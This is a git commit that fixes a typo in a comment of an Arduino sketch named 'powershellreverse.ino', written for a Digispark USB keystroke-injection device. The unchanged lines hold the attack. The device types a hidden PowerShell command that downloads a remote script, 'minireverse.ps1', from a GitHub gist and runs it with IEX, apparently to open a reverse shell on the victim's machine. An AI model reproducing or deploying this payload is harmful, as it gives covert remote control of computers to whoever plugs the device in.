a9e6796e54f1825e9bdb5979448049b0569d642b
zetta0 <62196284+zetta0@users.noreply.github.com>
2022-03-21 15:22:29 -0500

    Update powershellreverse.ino
    I can't spell

--- powershellreverse.ino
+++ powershellreverse.ino
@@ -10,6 +10,6 @@ void loop() {
   DigiKeyboard.print("powershell -W Hidden \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/zetta0/1bc28897a5a9b2a87768956535ff2f0d/raw/3cf790c1dbd661076cdd532c30fdddacf13d3668/minireverse.ps1');\"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for (;;) {
-    /*Stops the digispark from running the scipt again*/
+    /*Stops the digispark from running the script again*/
   }
 }
